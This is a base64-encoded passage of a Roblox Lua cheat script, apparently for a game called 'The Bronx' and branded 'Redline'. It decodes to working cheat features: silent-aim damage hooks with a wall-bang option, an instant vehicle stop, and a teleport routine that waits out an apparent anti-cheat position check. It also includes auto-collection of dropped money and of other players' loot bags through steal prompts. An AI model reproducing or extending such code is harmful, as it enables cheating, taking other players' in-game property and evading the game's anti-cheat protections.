ZiBWYWx1ZTpGaW5kRmlyc3RDaGlsZCgiQ291bnRlck0iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIENvdW50ZXJJbnN0YW5jZSA9IFZhbHVlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBmb3IgSW5kZXgsIFZhbHVlIGluIG5leHQsIHtXb3Jrc3BhY2UuQ291bnRlckJhZzpHZXRDaGlsZHJlbigpLCBDb3VudGVySW5zdGFuY2U6R2V0Q2hpbGRyZW4oKX0gZG8KICAgICAgICAgICAgICAgICAgICBmb3IgX0luZGV4LCBfVmFsdWUgaW4gVmFsdWUgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgX1ZhbHVlOkZpbmRGaXJzdENoaWxkKCJDYXNoUHJvbXB0IiwgdHJ1ZSkgYW5kIF9WYWx1ZTpGaW5kRmlyc3RDaGlsZCgiQ2FzaFByb21wdCIsIHRydWUpLkVuYWJsZWQgYW5kIF9WYWx1ZTpGaW5kRmlyc3RDaGlsZCgiQ2FzaFByb21wdCIsIHRydWUpLk9iamVjdFRleHQgPT0gIkNvdW50IEJyZWFkIiBhbmQgX1ZhbHVlOkZpbmRGaXJzdENoaWxkKCJHcmFiUHJvbXB0IiwgdHJ1ZSkgYW5kIG5vdCBfVmFsdWU6RmluZEZpcnN0Q2hpbGQoIkdyYWJQcm9tcHQiLCB0cnVlKS5FbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBfVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgVXNlcklucHV0U2VydmljZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oSW5wdXQsIEdhbWVQcm9jZXNzZWRFdmVudCkKICAgICAgICAgICAgICAgIGlmIElucHV0LktleUNvZGUgPT0gQ29uZmlnLlRoZUJyb254LlZlaGljbGVNb2RpZmljYXRpb25zLkluc3RhbnRTdG9wQmluZCBhbmQgQ29uZmlnLlRoZUJyb254LlZlaGljbGVNb2RpZmljYXRpb25zLkluc3RhbnRTdG9wIGFuZCAobm90IEdhbWVQcm9jZXNzZWRFdmVudCkgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0eXBlb2YoTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyKSA9PSAiSW5zdGFuY2UiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEh1bWFub2lkIGFuZCB0eXBlb2YoSHVtYW5vaWQpID09ICJJbnN0YW5jZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFNlYXRQYXJ0ID0gSHVtYW5vaWQuU2VhdFBhcnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBTZWF0UGFydCBhbmQgdHlwZW9mKFNlYXRQYXJ0KSA9PSAiSW5zdGFuY2UiIGFuZCBTZWF0UGFydDpJc0EoIlZlaGljbGVTZWF0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZWF0UGFydC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ICo9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNlYXRQYXJ0LkFzc2VtYmx5QW5ndWxhclZlbG9jaXR5ICo9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaWYgU29sYXJhIHRoZW4KICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLlBsYXllclNjcmlwdHMuQnVsbGV0VmlzdWFsaXplckNsaWVudFNjcmlwdC5WaXN1YWxpemUuRXZlbnQ6Q29ubmVjdChmdW5jdGlvbiguLi4pCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsuLi59CgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFsiZGFtYWdlIl0gPSBhcmdzWzEwXVsxXSwKICAgICAgICAgICAgICAgICAgICAgICAgWyJwbGF5ZXIiXSA9IGFyZ3NbMV0uUGFyZW50CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiByYXdnZXQoZGF0YSwgImRhbWFnZSIpIGFuZCB0eXBlKGFyZ3NbMTBdWzFdKSA9PSAnbnVtYmVyJyBhbmQgQ29uZmlnLlNpbGVudC5FbmFibGVkIGFuZCBDb25maWcuU2lsZW50LlRhcmdldHRpbmcgYW5kIGFyZ3NbMTBdIGFuZCBkYXRhWyJwbGF5ZXIiXSA9PSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgKG1hdGgucmFuZG9tKDAsIDEwMCkgPD0gQ29uZmlnLlNpbGVudC5IaXRDaGFuY2UpIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgUmFuZG9tUGFydCA9IENvbmZpZy5TaWxlbnQuVGFyZ2V0UGFydFsxXSBhbmQgQ29uZmlnLlNpbGVudC5UYXJnZXRQYXJ0W21hdGgucmFuZG9tKDEsICNDb25maWcuU2lsZW50LlRhcmdldFBhcnQpXSBvciAiSGVhZCIKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIFNpbGVudFRhcmdldCBhbmQgU2lsZW50VGFyZ2V0LkNoYXJhY3RlciBhbmQgU2lsZW50VGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZChSYW5kb21QYXJ0KSB0aGVuCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5TaWxlbnQuV2FsbEJhbmcgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEhvbG9jYXVzdCA9IFdvcmtzcGFjZTpGaW5kUGFydE9uUmF5V2l0aElnbm9yZUxpc3QoUmF5Lm5ldyhMb2NhbFBsYXllci5DaGFyYWN0ZXJbUmFuZG9tUGFydF0uUG9zaXRpb24sIChTaWxlbnRUYXJnZXQuQ2hhcmFjdGVyW1JhbmRvbVBhcnRdLlBvc2l0aW9uIC0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW1JhbmRvbVBhcnRdLlBvc2l0aW9uKS5Vbml0ICogKFNpbGVudFRhcmdldC5DaGFyYWN0ZXJbUmFuZG9tUGFydF0uUG9zaXRpb24gLSBMb2NhbFBsYXllci5DaGFyYWN0ZXJbUmFuZG9tUGFydF0uUG9zaXRpb24pLk1hZ25pdHVkZSksIHtTaWxlbnRUYXJnZXQuQ2hhcmFjdGVyLCBMb2NhbFBsYXllci5DaGFyYWN0ZXJ9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEhvbG9jYXVzdCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtpbGxfZ3VuKHRvc3RyaW5nKFNpbGVudFRhcmdldCksIFJhbmRvbVBhcnQsIGRhdGFbImRhbWFnZSJdKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgIAogICAgICAgICAgICBIaWRlVUkgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihUaXRsZSwgVGltaW5nKQogICAgICAgICAgICAgICAgZ2V0Z2VudigpLkhpZGVTY3JlZW5HVUkgPSBJbnN0YW5jZS5uZXcoIlNjcmVlbkd1aSIpCiAgICAgICAgICAgICAgICBnZXRnZW52KCkuSGlkZVNjcmVlbkdVSS5OYW1lID0gIlxuXG5cblxuXG4iCiAgICAgICAgICAgICAgICBnZXRnZW52KCkuSGlkZVNjcmVlbkdVSS5QYXJlbnQgPSBnZXRodWkgYW5kIGdldGh1aSgpIG9yIFNlcnZpY2VzLkNvcmVHdWkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBmcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgICAgICAgICAgZnJhbWUuTmFtZSA9ICJCbGFja0ZyYW1lIgogICAgICAgICAgICAgICAgZnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygyLCAwLCAyLCAwKSAKICAgICAgICAgICAgICAgIGZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIC0xNTUsIDAsIC0xNTUpIAogICAgICAgICAgICAgICAgZnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApIAogICAgICAgICAgICAgICAgZnJhbWUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgICAgIGZyYW1lLlBhcmVudCA9IGdldGdlbnYoKS5IaWRlU2NyZWVuR1VJCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgdGV4dExhYmVsID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgICAgICAgICAgICAgdGV4dExhYmVsLk5hbWUgPSAiXG5oaWRldWlhZXRocmEiCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLCA0MDAsIDAsIDEwMCkKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnNCb2xkCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuUmljaFRleHQgPSB0cnVlCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuVGV4dCA9ICc8Zm9udCBjb2xvcj0icmdiKDI1NSwyNTUsMjU1KSI+UmVkbGluZTwvZm9udD5cbicgLi4gVGl0bGUKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgdGV4dExhYmVsLlRleHRTaXplID0gMzYKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5UZXh0U3Ryb2tlVHJhbnNwYXJlbmN5ID0gMC44IAogICAgICAgICAgICAgICAgdGV4dExhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5DZW50ZXIKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5UZXh0WUFsaWdubWVudCA9IEVudW0uVGV4dFlBbGlnbm1lbnQuQ2VudGVyCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuVGV4dFdyYXBwZWQgPSB0cnVlCiAgICAgICAgICAgICAgICB0ZXh0TGFiZWwuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKICAgICAgICAgICAgICAgIHRleHRMYWJlbC5QYXJlbnQgPSBnZXRnZW52KCkuSGlkZVNjcmVlbkdVSQogICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIFRpbWluZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHN0YXJ0VGltZSA9IHRpY2soKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBlbmRUaW1lID0gc3RhcnRUaW1lICsgVGltaW5nCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIHRpY2soKSA8IGVuZFRpbWUgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRpbWVMZWZ0ID0gZW5kVGltZSAtIHRpY2soKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRleHRMYWJlbC5UZXh0ID0gc3RyaW5nLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnPGZvbnQgY29sb3I9InJnYigyNTUsMjU1LDI1NSkiPlJlZGxpbmU8L2ZvbnQ+IFxuJXNcbnBsZWFzZSB3YWl0IDogPGZvbnQgY29sb3I9InJnYigyNTUsMjU1LDI1NSkiPiUuMmY8L2ZvbnQ+IHNlY29uZHMnLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlLCBtYXRoLm1heCh0aW1lTGVmdCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXR1cm4gdGV4dExhYmVsCiAgICAgICAgICAgIGVuZCkgICAgICAgICAgICAKCiAgICAgICAgICAgIERlbGV0ZVNlY3JldFVJID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oVGl0bGUpCiAgICAgICAgICAgICAgICBpZiBnZXRnZW52KCkuSGlkZVNjcmVlbkdVSSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLkhpZGVTY3JlZW5HVUk6RGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLkhpZGVTY3JlZW5HVUkgPSBuaWwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAtLW9sZCB0cCBzdGFydAogICAgICAgIC0tW1tnZXRnZW52KCkuVGVsZXBvcnQgPSBMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihDRnJhbWUsIERvbnRVaSkKICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIHRoZW4gcmV0dXJuIGVuZAoKICAgICAgICAgICAgICAgIC0tW1tpZiBub3QgRG9udFVpIHRoZW4KICAgICAgICAgICAgICAgICAgICBIaWRlVUkoInRlbGVwb3J0aW5nLlxucGxlYXNlIHdhaXQuIikKICAgICAgICAgICAgICAgIGVuZF1dCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tW1tMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIik6Q2hhbmdlU3RhdGUoMCkKCiAgICAgICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgbm90IExvY2FsUGxheWVyOkdldEF0dHJpYnV0ZSgiTGFzdEFDUG9zIikKICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZQoKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIik6Q2hhbmdlU3RhdGUoMikKCiAgICAgICAgICAgICAgICAtLVtbaWYgbm90IERvbnRVaSB0aGVuCiAgICAgICAgICAgICAgICAgICAgRGVsZXRlU2VjcmV0VUkoKQogICAgICAgICAgICAgICAgZW5kXV0KCiAgICAgICAgICAgICAgICAtLVtbcmV0dXJuIHRydWUKICAgICAgICAgICAgZW5kKV1dCi0tIG9sZCB0cCBlbmQKCiAgICAgICAgICAgIC0tbmV3IHRwCmdldGdlbnYoKS5UZWxlcG9ydCA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKENGLCBEb250VWkpCiAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4gcmV0dXJuIGVuZAogICAgbG9jYWwgaHVtID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCiAgICBsb2NhbCBocnAgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoKICAgIGlmIG5vdCBodW0gb3Igbm90IGhycCB0aGVuIHJldHVybiBlbmQKICAgIGh1bS5XYWxrU3BlZWQgPSAwCiAgICBodW0uSnVtcFBvd2VyID0gMAogICAgaHVtLkF1dG9Sb3RhdGUgPSBmYWxzZQogICAgdGFzay53YWl0KDAuNSkKCiAgICBodW06Q2hhbmdlU3RhdGUoMCkKCiAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgbm90IExvY2FsUGxheWVyOkdldEF0dHJpYnV0ZSgiTGFzdEFDUG9zIikKCiAgICBocnAuQ0ZyYW1lID0gQ0YKCiAgICB0YXNrLndhaXQoMC41KQoKICAgIGh1bTpDaGFuZ2VTdGF0ZSgyKQogICAgaHVtLldhbGtTcGVlZCA9IDE2CiAgICBodW0uSnVtcFBvd2VyID0gNTAKICAgIGh1bS5BdXRvUm90YXRlID0gdHJ1ZQoKICAgIHJldHVybiB0cnVlIAplbmQpCiAgICAgICAgICAgLS0gbmV3IHRwIGVuZAoKCgogICAgICAgICAgIC0tIGV4cGVyaW1hbnRhbCB0ZWxlcG9ydAotLVtbZ2V0Z2VudigpLlRlbGVwb3J0ID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oQ0YsIERvbnRVaSkKICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgbG9jYWwgaHVtID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgbG9jYWwgaHJwID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBub3QgaHVtIG9yIG5vdCBocnAgdGhlbiByZXR1cm4gZW5kCgogICAgaHJwLkFuY2hvcmVkID0gdHJ1ZQogICAgaHVtLkF1dG9Sb3RhdGUgPSBmYWxzZQogICAgaHVtOkNoYW5nZVN0YXRlKDApCgogICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIG5vdCBMb2NhbFBsYXllcjpHZXRBdHRyaWJ1dGUoIkxhc3RBQ1BvcyIpCgogICAgaHJwLkNGcmFtZSA9IENGCgogICAgdGFzay53YWl0KDAuMSkKCiAgICBodW06Q2hhbmdlU3RhdGUoMikKICAgIGhycC5BbmNob3JlZCA9IGZhbHNlCiAgICBodW0uQXV0b1JvdGF0ZSA9IHRydWUKCiAgICByZXR1cm4gdHJ1ZQplbmQpXV0KCiAgICAgICAgICAgIEdldFdvcmtpbmdTYWZlID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgSG91c2U7IGxvY2FsIFNhZmU7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gd29ya3NwYWNlWyIxIyBNYXAiXVsiMiBDcm9zc3dhbGtzIl0uU2FmZXM6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIFZhbHVlOklzQSgiTW9kZWwiKSBhbmQgVmFsdWUuTmFtZSA9PSAiU2FmZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5Xb3JsZFBpdm90ID09IENGcmFtZS5uZXcoLTE0NzkuNDY2MzEsIDI4NS4yNjM1NSwgLTkyOC44OTA1NjQsIDAsIDAsIDEsIC0xLCAwLCAwLCAwLCAtMSwgMCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2FmZSA9IFZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAoKCiAgICAgICAgICAgICAgICByZXR1cm4gU2FmZQogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBDb2xsZWN0RHJvcHBlZE1vbmV5ID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKSAgCiAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LkZhcm1zLkNvbGxlY3REcm9wcGVkTW9uZXkgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBpZiBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIE9sZENGcmFtZSA9IExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZQoKICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gbmV4dCwge1dvcmtzcGFjZS5Eb2xsYXM6R2V0Q2hpbGRyZW4oKX0gZG8KICAgICAgICAgICAgICAgICAgICBmb3IgX0luZGV4LCBfVmFsdWUgaW4gVmFsdWUgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9WYWx1ZTpJc0EoIlBhcnQiKSB0aGVuIGNvbnRpbnVlIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnQoX1ZhbHVlLkNGcmFtZSArIFZlY3RvcjMubmV3KDAsIDMuNSwgMCkpCgogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC40KQoKICAgICAgICAgICAgICAgICAgICAgICAgZmlyZXByb3hpbWl0eXByb21wdChfVmFsdWUuUHJveGltaXR5UHJvbXB0KQoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KF9WYWx1ZS5Qcm94aW1pdHlQcm9tcHQuSG9sZER1cmF0aW9uKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgVGVsZXBvcnQoT2xkQ0ZyYW1lKQoKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjQpCgogICAgICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbG9jYWwgR3VuTmFtZXMgPSB7fQoKICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBMaWdodGluZzpHZXRDaGlsZHJlbigpIGRvCiAgICAgICAgICAgICAgICBpZiBWYWx1ZTpJc0EoIlRvb2wiKSBhbmQgVmFsdWU6RmluZEZpcnN0Q2hpbGQoIlNldHRpbmciKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KEd1bk5hbWVzLCBWYWx1ZS5OYW1lKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgQ29sbGVjdExvb3RCYWdzID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKSAgCiAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LkZhcm1zLkNvbGxlY3REcm9wcGVkTG9vdCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgb3Igbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgbG9jYWwgT2xkQ0ZyYW1lID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCgogICAgICAgICAgICAgICAgZm9yIEluZGV4LCBWYWx1ZSBpbiBuZXh0LCB7V29ya3NwYWNlLlN0b3JhZ2U6R2V0Q2hpbGRyZW4oKX0gZG8KICAgICAgICAgICAgICAgICAgICBmb3IgX0luZGV4LCBfVmFsdWUgaW4gVmFsdWUgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9WYWx1ZTpJc0EoIk1lc2hQYXJ0IikgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgX1ZhbHVlOkZpbmRGaXJzdENoaWxkKCJQbGF5ZXJOYW1lIikuVmFsdWUgPT0gTG9jYWxQbGF5ZXIuTmFtZSB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgX0d1bkZvdW5kID0gdHJ1ZQoKICAgICAgICAgICAgICAgICAgICAgICAgLS1bW2lmIENvbmZpZy5UaGVCcm9ueC5GYXJtcy5Pbmx5Q29sbGVjdEd1bnMgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgX0d1bkZvdW5kID0gZmFsc2U7IGZvciBfX0luZGV4LCBfX1ZhbHVlIGluIF9WYWx1ZS5Db250YWluZXI6R2V0Q2hpbGRyZW4oKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQoR3VuTmFtZXMsIF9fVmFsdWUuTmFtZSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfR3VuRm91bmQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZF1dCgogICAgICAgICAgICAgICAgICAgICAgICBpZiBfR3VuRm91bmQgPT0gZmFsc2UgdGhlbiBjb250aW51ZSBlbmQ7CgogICAgICAgICAgICAgICAgICAgICAgICBUZWxlcG9ydChfVmFsdWUuQ0ZyYW1lICsgVmVjdG9yMy5uZXcoMCwgMy41LCAwKSkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjQpCgogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KF9WYWx1ZS5zdGVhbHByb21wdCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdChfVmFsdWUuc3RlYWxwcm9tcHQuSG9sZER1cmF0aW9uKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgV29ya3NwYWNlLlN0b3JhZ2UuQ2hpbGRBZGRlZDpDb25uZWN0KExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oQ29sbGVjdExvb3RCYWdzKQogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgV29ya3NwYWNlLkRvbGxhcy5DaGlsZEFkZGVkOkNvbm5lY3QoTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgdGFzay5zcGF3bihDb2xsZWN0RHJvcHBlZE1vbmV5KQogICAgICAgICAgICBlbmQpKQoKICAgICAgICAgICAgV2FzaE1vbmV5ID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgLS0gVE9ETwogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBEcnlNb25leSA9IExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIC0tIFRPRE8KICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgUnVuU2VydmljZS5QcmVSZW5kZXI6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLlRoZUJyb254LlBsYX